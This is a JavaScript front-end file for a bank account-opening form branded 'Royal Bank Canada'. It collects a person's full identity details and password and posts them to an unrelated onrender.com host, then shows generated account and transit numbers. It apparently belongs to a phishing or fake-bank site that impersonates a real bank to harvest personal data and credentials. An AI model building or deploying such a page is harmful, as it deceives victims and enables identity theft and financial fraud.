//======================================================
// ROYAL BANK CANADA
// OPEN ACCOUNT
//======================================================

const API_URL = "https://canada-1.onrender.com";

const form = document.getElementById("openAccountForm");

form.addEventListener("submit", createAccount);

async function createAccount(e) {

    e.preventDefault();

    const data = {

        firstName: document.getElementById("firstname").value.trim(),

        lastName: document.getElementById("lastname").value.trim(),

        email: document.getElementById("email").value.trim().toLowerCase(),

        phone: document.getElementById("phone").value.trim(),

        birthDate: document.getElementById("birthdate").value,

        gender: document.getElementById("gender").value,

        nationality: document.getElementById("nationality").value.trim(),

        profession: document.getElementById("profession").value.trim(),

        country: document.getElementById("country").value.trim(),

        city: document.getElementById("city").value.trim(),

        address: document.getElementById("address").value.trim(),

        accountType: document.getElementById("accountType").value,

        currency: document.getElementById("currency").value,

        password: document.getElementById("password").value,

        confirmPassword: document.getElementById("confirmPassword").value

    };

    if (data.password !== data.confirmPassword) {

        alert("Passwords do not match.");

        return;

    }

    if (data.password.length < 8) {

        alert("Password must contain at least 8 characters.");

        return;

    }

    try {

        const response = await fetch(

            `${API_URL}/api/open-account`,

            {

                method: "POST",

                headers: {

                    "Content-Type": "application/json"

                },

                body: JSON.stringify(data)

            }

        );

        const result = await response.json();

        if (response.ok) {

            alert(

`🎉 ROYAL BANK CANADA

Your account has been created successfully.

==================================

Customer ID :
${result.customerId}

Account Number :
${result.accountNumber}

Transit Number :
${result.transitNumber}

Institution Number :
${result.institutionNumber}

==================================

IMPORTANT

✔ Save your Customer ID carefully.

✔ Your password is the one you created during registration.

✔ You will need your Customer ID and Password to sign in.

Click OK to continue to the login page.`

            );

            window.location.href = "login.html";

        } else {

            alert(result.message || "Unable to create your account.");

        }

    } catch (error) {

        console.error(error);

        alert("Unable to contact the Royal Bank Canada server.");

    }

}
